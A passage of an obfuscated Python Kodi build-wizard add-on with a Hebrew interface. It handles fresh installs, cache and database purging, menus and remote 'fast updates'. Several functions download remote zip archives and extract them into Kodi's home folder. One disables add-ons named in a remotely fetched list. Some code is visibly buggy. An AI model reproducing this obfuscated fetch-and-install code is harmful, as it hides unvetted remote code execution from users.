				elif OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -2 ]=='userdata'and OO0O00OO000O0OOOO [O00O0O00O000OOOO0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0O00OO000O0OOOO [O00O0O00O000OOOO0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4636
				elif OOOOO00OOOO0OOO0O in LOGFILES :wiz .log ("Keep Log File: %s"%OOOOO00OOOO0OOO0O ,xbmc .LOGNOTICE )#line:4637
				elif OOOOO00OOOO0OOO0O .endswith ('.db'):#line:4638
					try :#line:4639
						if OOOOO00OOOO0OOO0O ==OOO0O0O0O0000000O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOOO00OOOO0OOO0O ,KODIV ),xbmc .LOGNOTICE )#line:4640
						else :os .remove (os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ))#line:4641
					except Exception as O0O00OO0O00OO00OO :#line:4642
						if not OOOOO00OOOO0OOO0O .startswith ('Textures13'):#line:4643
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4644
							wiz .log ("-> %s"%(str (O0O00OO0O00OO00OO )),xbmc .LOGNOTICE )#line:4645
							wiz .purgeDb (os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ))#line:4646
				else :#line:4647
					DP .update (int (wiz .percentage (O00000OOOOO0O000O ,O0O0O0O0O0O0O0OOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO00OOOO0OOO0O ),'')#line:4648
					try :os .remove (os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ))#line:4649
					except Exception as O0O00OO0O00OO00OO :#line:4650
						wiz .log ("Error removing %s"%os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),xbmc .LOGNOTICE )#line:4651
						wiz .log ("-> / %s"%(str (O0O00OO0O00OO00OO )),xbmc .LOGNOTICE )#line:4652
			if DP .iscanceled ():#line:4653
				DP .close ()#line:4654
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4655
				return False #line:4656
		for O0OOO00O0OOOOOO00 ,OO0OOOOO00OO0O000 ,OO0OOO0000OO0O000 in os .walk (O0OOOO0OO0O000OO0 ,topdown =True ):#line:4657
			OO0OOOOO00OO0O000 [:]=[O00O0O00O0OOO0OO0 for O00O0O00O0OOO0OO0 in OO0OOOOO00OO0O000 if O00O0O00O0OOO0OO0 not in EXCLUDES ]#line:4658
			for OOOOO00OOOO0OOO0O in OO0OOOOO00OO0O000 :#line:4659
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO00OOOO0OOO0O ),'')#line:4660
			  if OOOOO00OOOO0OOO0O not in ["Database","userdata","temp","addons","addon_data"]:#line:4661
			   if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4662
			    if not (OOOOO00OOOO0OOO0O =='skin.titan'and KEEPSKIN3 =='true'):#line:4664
			      if not (OOOOO00OOOO0OOO0O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4665
			       if not (OOOOO00OOOO0OOO0O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4666
			        if not (OOOOO00OOOO0OOO0O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4667
			         if not (OOOOO00OOOO0OOO0O =='program.apollo'and KEEPINFO =='true'):#line:4668
			          if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4669
			            if not (OOOOO00OOOO0OOO0O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4671
			             if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4672
			              if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4673
			               if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4674
			                if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4675
			                 if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4676
			                  if not (OOOOO00OOOO0OOO0O =='plugin.video.neptune'and KEEPINFO =='true'):#line:4677
			                   if not (OOOOO00OOOO0OOO0O =='plugin.video.youtube'and KEEPINFO =='true'):#line:4678
			                    if not (OOOOO00OOOO0OOO0O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4679
			                     if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4680
			                       if not (OOOOO00OOOO0OOO0O =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4682
			                           if not (OOOOO00OOOO0OOO0O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4686
			                            if not (OOOOO00OOOO0OOO0O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4687
			                             if not (OOOOO00OOOO0OOO0O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4688
			                              if not (OOOOO00OOOO0OOO0O =='plugin.video.quasar'and KEEPINFO =='true'):#line:4689
			                               if not (OOOOO00OOOO0OOO0O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4690
			                                  shutil .rmtree (os .path .join (O0OOO00O0OOOOOO00 ,OOOOO00OOOO0OOO0O ),ignore_errors =True ,onerror =None )#line:4692
			if DP .iscanceled ():#line:4693
				DP .close ()#line:4694
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4695
				return False #line:4696
		DP .close ()#line:4697
		wiz .clearS ('build')#line:4698
		if over ==True :#line:4699
			return True #line:4700
		elif install =='restore':#line:4701
			return True #line:4702
		elif install :#line:4703
			buildWizard (install ,'normal',over =True )#line:4704
		else :#line:4705
			if INSTALLMETHOD ==1 :OOOO0OO00OO00OOO0 =1 #line:4706
			elif INSTALLMETHOD ==2 :OOOO0OO00OO00OOO0 =0 #line:4707
			else :OOOO0OO00OO00OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4708
			if OOOO0OO00OO00OOO0 ==1 :wiz .reloadFix ('fresh')#line:4709
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4710
	else :#line:4711
		if not install =='restore':#line:4712
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4713
			wiz .refresh ()#line:4714
def clearCache ():#line:4719
		wiz .clearCache ()#line:4720
def fixwizard ():#line:4724
		wiz .fixwizard ()#line:4725
def totalClean ():#line:4727
		wiz .clearCache ()#line:4729
		wiz .clearPackages ('total')#line:4730
		clearThumb ('total')#line:4731
		cleanfornewbuild ()#line:4732
def cleanfornewbuild ():#line:4733
		try :#line:4734
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4735
		except :#line:4736
			pass #line:4737
		try :#line:4738
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4739
		except :#line:4740
			pass #line:4741
		try :#line:4742
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4743
		except :#line:4744
			pass #line:4745
def clearThumb (type =None ):#line:4746
	OOOO0OOO0O00OO0OO =wiz .latestDB ('Textures')#line:4747
	if not type ==None :OOOO00OOOOO0O00O0 =1 #line:4748
	else :OOOO00OOOOO0O00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOOO0OOO0O00OO0OO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4749
	if OOOO00OOOOO0O00O0 ==1 :#line:4750
		try :wiz .removeFile (os .join (DATABASE ,OOOO0OOO0O00OO0OO ))#line:4751
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOOO0OOO0O00OO0OO )#line:4752
		wiz .removeFolder (THUMBS )#line:4753
	else :wiz .log ('Clear thumbnames cancelled')#line:4755
	wiz .redoThumbs ()#line:4756
def purgeDb ():#line:4758
	O0OOO0OO0000O000O =[];OO0O0OOO00OOOO000 =[]#line:4759
	for OOO00OO00O00OO0OO ,OOO0O00OO0O00O0O0 ,O0O0OOO0O00OOOO0O in os .walk (HOME ):#line:4760
		for O0000OO0O0OO00OOO in fnmatch .filter (O0O0OOO0O00OOOO0O ,'*.db'):#line:4761
			if O0000OO0O0OO00OOO !='Thumbs.db':#line:4762
				O000OOOOO000000O0 =os .path .join (OOO00OO00O00OO0OO ,O0000OO0O0OO00OOO )#line:4763
				O0OOO0OO0000O000O .append (O000OOOOO000000O0 )#line:4764
				OOO00O000OO00O000 =O000OOOOO000000O0 .replace ('\\','/').split ('/')#line:4765
				OO0O0OOO00OOOO000 .append ('(%s) %s'%(OOO00O000OO00O000 [len (OOO00O000OO00O000 )-2 ],OOO00O000OO00O000 [len (OOO00O000OO00O000 )-1 ]))#line:4766
	if KODIV >=16 :#line:4767
		O0O00O00OO000OO0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0O0OOO00OOOO000 )#line:4768
		if O0O00O00OO000OO0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4769
		elif len (O0O00O00OO000OO0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4770
		else :#line:4771
			for OOOOO0O000OO00OOO in O0O00O00OO000OO0O :wiz .purgeDb (O0OOO0OO0000O000O [OOOOO0O000OO00OOO ])#line:4772
	else :#line:4773
		O0O00O00OO000OO0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0O0OOO00OOOO000 )#line:4774
		if O0O00O00OO000OO0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4775
		else :wiz .purgeDb (O0OOO0OO0000O000O [OOOOO0O000OO00OOO ])#line:4776
def fastupdatefirstbuild (O0OO0O00O00OOOO0O ):#line:4782
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4783
	if ENABLE =='Yes':#line:4784
		if not NOTIFY =='true':#line:4785
			OOOOOOO0O0000OOO0 =wiz .workingURL (NOTIFICATION )#line:4786
			if OOOOOOO0O0000OOO0 ==True :#line:4787
				O0O0OOOO00O0O0OO0 ,O000OO0OO00OO0O00 =wiz .splitNotify (NOTIFICATION )#line:4788
				if not O0O0OOOO00O0O0OO0 ==False :#line:4790
					try :#line:4791
						O0O0OOOO00O0O0OO0 =int (O0O0OOOO00O0O0OO0 );O0OO0O00O00OOOO0O =int (O0OO0O00O00OOOO0O )#line:4792
						checkidupdate ()#line:4793
						wiz .setS ("notedismiss","true")#line:4794
						if O0O0OOOO00O0O0OO0 ==O0OO0O00O00OOOO0O :#line:4795
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0O0OOOO00O0O0OO0 ),xbmc .LOGNOTICE )#line:4796
						elif O0O0OOOO00O0O0OO0 >O0OO0O00O00OOOO0O :#line:4798
							wiz .log ("[Notifications] id: %s"%str (O0O0OOOO00O0O0OO0 ),xbmc .LOGNOTICE )#line:4799
							wiz .setS ('noteid',str (O0O0OOOO00O0O0OO0 ))#line:4800
							wiz .setS ("notedismiss","true")#line:4801
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4804
					except Exception as OOOOOO0O0O0000O00 :#line:4805
						wiz .log ("Error on Notifications Window: %s"%str (OOOOOO0O0O0000O00 ),xbmc .LOGERROR )#line:4806
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4808
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOOOOO0O0000OOO0 ),xbmc .LOGNOTICE )#line:4809
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4810
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4811
def checkidupdate ():#line:4817
				wiz .setS ("notedismiss","true")#line:4819
				OOO0O0000OOO00O0O =wiz .workingURL (NOTIFICATION )#line:4820
				OO00O000OOO0OOOOO =" Kodi Premium"#line:4822
				O000O0OO00OO0OO0O =wiz .checkBuild (OO00O000OOO0OOOOO ,'gui')#line:4823
				O0000O0O0O0OO00O0 =OO00O000OOO0OOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4824
				if not wiz .workingURL (O000O0OO00OO0OO0O )==True :return #line:4825
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4826
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00O000OOO0OOOOO ),'','אנא המתן')#line:4827
				O00OOO0O0000OOO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0000O0O0O0OO00O0 )#line:4828
				try :os .remove (O00OOO0O0000OOO0O )#line:4829
				except :pass #line:4830
				logging .warning (O000O0OO00OO0OO0O )#line:4831
				if 'google'in O000O0OO00OO0OO0O :#line:4832
				   OOOOOO0O00000O000 =googledrive_download (O000O0OO00OO0OO0O ,O00OOO0O0000OOO0O ,DP ,wiz .checkBuild (OO00O000OOO0OOOOO ,'filesize'))#line:4833
				else :#line:4836
				  downloader .download (O000O0OO00OO0OO0O ,O00OOO0O0000OOO0O ,DP )#line:4837
				xbmc .sleep (100 )#line:4838
				O0O0OO0OOO0O0OO0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O000OOO0OOOOO )#line:4839
				DP .update (0 ,O0O0OO0OOO0O0OO0O ,'','אנא המתן')#line:4840
				extract .all (O00OOO0O0000OOO0O ,HOME ,DP ,title =O0O0OO0OOO0O0OO0O )#line:4841
				DP .close ()#line:4842
				wiz .defaultSkin ()#line:4843
				wiz .lookandFeelData ('save')#line:4844
				if KODIV >=18 :#line:4845
					skindialogsettind18 ()#line:4846
				if INSTALLMETHOD ==1 :OOOOOOO00OOO0OO00 =1 #line:4849
				elif INSTALLMETHOD ==2 :OOOOOOO00OOO0OO00 =0 #line:4850
				else :DP .close ()#line:4851
def gaiaserenaddon ():#line:4853
  OO0OOOO0O0000O00O =(ADDON .getSetting ("gaiaseren"))#line:4854
  OOO0O00O00O0OOOOO =(ADDON .getSetting ("rdbuild"))#line:4855
  if OO0OOOO0O0000O00O =='true'and OOO0O00O00O0OOOOO =='true':#line:4856
    OOOOO00O0O000OOO0 =(NEWFASTUPDATE )#line:4857
    O0O00OOO00O000O00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4858
    OOO00OO00OO0OO00O =xbmcgui .DialogProgress ()#line:4859
    OOO00OO00OO0OO00O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4860
    OOO0OO0000OO0O0OO =os .path .join (PACKAGES ,'isr.zip')#line:4861
    O0O0OOO0O0OOO0O00 =urllib2 .Request (OOOOO00O0O000OOO0 )#line:4862
    OOO000O0000O000O0 =urllib2 .urlopen (O0O0OOO0O0OOO0O00 )#line:4863
    O0OOO00O00OO00O00 =xbmcgui .DialogProgress ()#line:4865
    O0OOO00O00OO00O00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4866
    O0OOO00O00OO00O00 .update (0 )#line:4867
    O0OO0OOO0O0OOOOOO =open (OOO0OO0000OO0O0OO ,'wb')#line:4869
    try :#line:4871
      OOOO0OOO000000O0O =OOO000O0000O000O0 .info ().getheader ('Content-Length').strip ()#line:4872
      O00OO00OO00OOO000 =True #line:4873
    except AttributeError :#line:4874
          O00OO00OO00OOO000 =False #line:4875
    if O00OO00OO00OOO000 :#line:4877
          OOOO0OOO000000O0O =int (OOOO0OOO000000O0O )#line:4878
    OOOOO00O0O00OO0OO =0 #line:4880
    O00OOO000OO0O0OOO =time .time ()#line:4881
    while True :#line:4882
          O0OO000OO0OO0OOO0 =OOO000O0000O000O0 .read (8192 )#line:4883
          if not O0OO000OO0OO0OOO0 :#line:4884
              sys .stdout .write ('\n')#line:4885
              break #line:4886
          OOOOO00O0O00OO0OO +=len (O0OO000OO0OO0OOO0 )#line:4888
          O0OO0OOO0O0OOOOOO .write (O0OO000OO0OO0OOO0 )#line:4889
          if not O00OO00OO00OOO000 :#line:4891
              OOOO0OOO000000O0O =OOOOO00O0O00OO0OO #line:4892
          if O0OOO00O00OO00O00 .iscanceled ():#line:4893
             O0OOO00O00OO00O00 .close ()#line:4894
             try :#line:4895
              os .remove (OOO0OO0000OO0O0OO )#line:4896
             except :#line:4897
              pass #line:4898
             break #line:4899
          O00000O00O000OOOO =float (OOOOO00O0O00OO0OO )/OOOO0OOO000000O0O #line:4900
          O00000O00O000OOOO =round (O00000O00O000OOOO *100 ,2 )#line:4901
          OOOO0000OOOO0OO00 =OOOOO00O0O00OO0OO /(1024 *1024 )#line:4902
          OO00OO0OO0OO0OOO0 =OOOO0OOO000000O0O /(1024 *1024 )#line:4903
          O0OO0OOO0O000OOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO0000OOOO0OO00 ,'teal',OO00OO0OO0OO0OOO0 )#line:4904
          if (time .time ()-O00OOO000OO0O0OOO )>0 :#line:4905
            OOOOOO000O00O0OO0 =OOOOO00O0O00OO0OO /(time .time ()-O00OOO000OO0O0OOO )#line:4906
            OOOOOO000O00O0OO0 =OOOOOO000O00O0OO0 /1024 #line:4907
          else :#line:4908
           OOOOOO000O00O0OO0 =0 #line:4909
          OO00OOOO0000000OO ='KB'#line:4910
          if OOOOOO000O00O0OO0 >=1024 :#line:4911
             OOOOOO000O00O0OO0 =OOOOOO000O00O0OO0 /1024 #line:4912
             OO00OOOO0000000OO ='MB'#line:4913
          if OOOOOO000O00O0OO0 >0 and not O00000O00O000OOOO ==100 :#line:4914
              O0OO0OOOOO0OO00O0 =(OOOO0OOO000000O0O -OOOOO00O0O00OO0OO )/OOOOOO000O00O0OO0 #line:4915
          else :#line:4916
              O0OO0OOOOO0OO00O0 =0 #line:4917
          O00O0O00OOOO00000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOO000O00O0OO0 ,OO00OOOO0000000OO )#line:4918
          O0OOO00O00OO00O00 .update (int (O00000O00O000OOOO ),O0OO0OOO0O000OOOO ,O00O0O00OOOO00000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4920
    OOOO00OOO00O00OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4923
    O0OO0OOO0O0OOOOOO .close ()#line:4926
    extract .all (OOO0OO0000OO0O0OO ,OOOO00OOO00O00OOO ,O0OOO00O00OO00O00 )#line:4927
    try :#line:4931
      os .remove (OOO0OO0000OO0O0OO )#line:4932
    except :#line:4933
      pass #line:4934
def testnotify ():#line:4936
	OO0O0OOOO000O0OOO =wiz .workingURL (NOTIFICATION )#line:4937
	if OO0O0OOOO000O0OOO ==True :#line:4938
		try :#line:4939
			O0O000000OOO0OOOO ,O00O0O000OO0O0OOO =wiz .splitNotify (NOTIFICATION )#line:4940
			if O0O000000OOO0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4941
			if STARTP2 ()=='ok':#line:4942
				notify .notification (O00O0O000OO0O0OOO ,True )#line:4943
		except Exception as OOO000O000O000O0O :#line:4944
			wiz .log ("Error on Notifications Window: %s"%str (OOO000O000O000O0O ),xbmc .LOGERROR )#line:4945
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4946
def testnotify2 ():#line:4947
	O0O0O00000O0O0OO0 =wiz .workingURL (NOTIFICATION2 )#line:4948
	if O0O0O00000O0O0OO0 ==True :#line:4949
		try :#line:4950
			O0OOOOOO000O0OO0O ,O0OO0OO0OOOO000OO =wiz .splitNotify (NOTIFICATION2 )#line:4951
			if O0OOOOOO000O0OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4952
			if STARTP2 ()=='ok':#line:4953
				notify .notification2 (O0OO0OO0OOOO000OO ,True )#line:4954
		except Exception as OOOO00000O00OO00O :#line:4955
			wiz .log ("Error on Notifications Window: %s"%str (OOOO00000O00OO00O ),xbmc .LOGERROR )#line:4956
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4957
def testnotify3 ():#line:4958
	OO0O0O0OO00O0OOOO =wiz .workingURL (NOTIFICATION3 )#line:4959
	if OO0O0O0OO00O0OOOO ==True :#line:4960
		try :#line:4961
			O0OO0OOOO0OO0OO00 ,OOOOO0O000OOOOO00 =wiz .splitNotify (NOTIFICATION3 )#line:4962
			if O0OO0OOOO0OO0OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4963
			if STARTP2 ()=='ok':#line:4964
				notify .notification3 (OOOOO0O000OOOOO00 ,True )#line:4965
		except Exception as OO0OOOOO0000O0OO0 :#line:4966
			wiz .log ("Error on Notifications Window: %s"%str (OO0OOOOO0000O0OO0 ),xbmc .LOGERROR )#line:4967
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4968
def servicemanual ():#line:4969
	O000OOO00O00OO000 =wiz .workingURL (HELPINFO )#line:4970
	if O000OOO00O00OO000 ==True :#line:4971
		try :#line:4972
			O00O00O00O000OOOO ,O0OO0OO0OOOOOOO0O =wiz .splitNotify (HELPINFO )#line:4973
			if O00O00O00O000OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:4974
			notify .helpinfo (O0OO0OO0OOOOOOO0O ,True )#line:4975
		except Exception as O0O00OOO0OO0OOO00 :#line:4976
			wiz .log ("Error on Notifications Window: %s"%str (O0O00OOO0OO0OOO00 ),xbmc .LOGERROR )#line:4977
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:4978
def testupdate ():#line:4980
	if BUILDNAME =="":#line:4981
		notify .updateWindow ()#line:4982
	else :#line:4983
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:4984
def testfirst ():#line:4986
	notify .firstRun ()#line:4987
def testfirstRun ():#line:4989
	notify .firstRunSettings ()#line:4990
def fastinstall ():#line:4993
	notify .firstRuninstall ()#line:4994
def addDir (O00O0OO0O000OOO00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5001
	O00OO0OOO000OO0O0 =sys .argv [0 ]#line:5002
	if not mode ==None :O00OO0OOO000OO0O0 +="?mode=%s"%urllib .quote_plus (mode )#line:5003
	if not name ==None :O00OO0OOO000OO0O0 +="&name="+urllib .quote_plus (name )#line:5004
	if not url ==None :O00OO0OOO000OO0O0 +="&url="+urllib .quote_plus (url )#line:5005
	O0OOOOO00O00OO000 =True #line:5006
	if themeit :O00O0OO0O000OOO00 =themeit %O00O0OO0O000OOO00 #line:5007
	OO0OO0OO0OOO000OO =xbmcgui .ListItem (O00O0OO0O000OOO00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5008
	OO0OO0OO0OOO000OO .setInfo (type ="Video",infoLabels ={"Title":O00O0OO0O000OOO00 ,"Plot":description })#line:5009
	OO0OO0OO0OOO000OO .setProperty ("Fanart_Image",fanart )#line:5010
	if not menu ==None :OO0OO0OO0OOO000OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5011
	O0OOOOO00O00OO000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OO0OOO000OO0O0 ,listitem =OO0OO0OO0OOO000OO ,isFolder =True )#line:5012
	return O0OOOOO00O00OO000 #line:5013
def addFile (O00OOOOOO0O000O0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5015
	OOO00OO00OOOOOOO0 =sys .argv [0 ]#line:5016
	if not mode ==None :OOO00OO00OOOOOOO0 +="?mode=%s"%urllib .quote_plus (mode )#line:5017
	if not name ==None :OOO00OO00OOOOOOO0 +="&name="+urllib .quote_plus (name )#line:5018
	if not url ==None :OOO00OO00OOOOOOO0 +="&url="+urllib .quote_plus (url )#line:5019
	O00000OO000OOOO00 =True #line:5020
	if themeit :O00OOOOOO0O000O0O =themeit %O00OOOOOO0O000O0O #line:5021
	OOOO0OO0O00000OO0 =xbmcgui .ListItem (O00OOOOOO0O000O0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5022
	OOOO0OO0O00000OO0 .setInfo (type ="Video",infoLabels ={"Title":O00OOOOOO0O000O0O ,"Plot":description })#line:5023
	OOOO0OO0O00000OO0 .setProperty ("Fanart_Image",fanart )#line:5024
	if not menu ==None :OOOO0OO0O00000OO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5025
	O00000OO000OOOO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO00OO00OOOOOOO0 ,listitem =OOOO0OO0O00000OO0 ,isFolder =False )#line:5026
	return O00000OO000OOOO00 #line:5027
def get_params ():#line:5029
	O0O0OOOOOO00O0O00 =[]#line:5030
	O0OO0O0O0O00OO000 =sys .argv [2 ]#line:5031
	if len (O0OO0O0O0O00OO000 )>=2 :#line:5032
		OO0O00O00O0OO0OOO =sys .argv [2 ]#line:5033
		OOOO00O0OOO0OOOO0 =OO0O00O00O0OO0OOO .replace ('?','')#line:5034
		if (OO0O00O00O0OO0OOO [len (OO0O00O00O0OO0OOO )-1 ]=='/'):#line:5035
			OO0O00O00O0OO0OOO =OO0O00O00O0OO0OOO [0 :len (OO0O00O00O0OO0OOO )-2 ]#line:5036
		OOOOO0OO0O0OO0OO0 =OOOO00O0OOO0OOOO0 .split ('&')#line:5037
		O0O0OOOOOO00O0O00 ={}#line:5038
		for O0O0O0OO00OO00O00 in range (len (OOOOO0OO0O0OO0OO0 )):#line:5039
			OOO0O00OO000O000O ={}#line:5040
			OOO0O00OO000O000O =OOOOO0OO0O0OO0OO0 [O0O0O0OO00OO00O00 ].split ('=')#line:5041
			if (len (OOO0O00OO000O000O ))==2 :#line:5042
				O0O0OOOOOO00O0O00 [OOO0O00OO000O000O [0 ]]=OOO0O00OO000O000O [1 ]#line:5043
		return O0O0OOOOOO00O0O00 #line:5045
def remove_addons ():#line:5047
	try :#line:5048
			import json #line:5049
			O0000OO0O0O0OO0OO =urllib2 .urlopen (remove_url ).readlines ()#line:5050
			for OO0OO0O0O00O0O0OO in O0000OO0O0O0OO0OO :#line:5051
				O00OO00O00O0000O0 =OO0OO0O0O00O0O0OO .split (':')[1 ].strip ()#line:5053
				O00OOO0OOO0O0O0OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O00OO00O00O0000O0 ,'false')#line:5054
				O0OO0O0OO0OO0OO00 =xbmc .executeJSONRPC (O00OOO0OOO0O0O0OO )#line:5055
				O0000000OOOOOO00O =json .loads (O0OO0O0OO0OO0OO00 )#line:5056
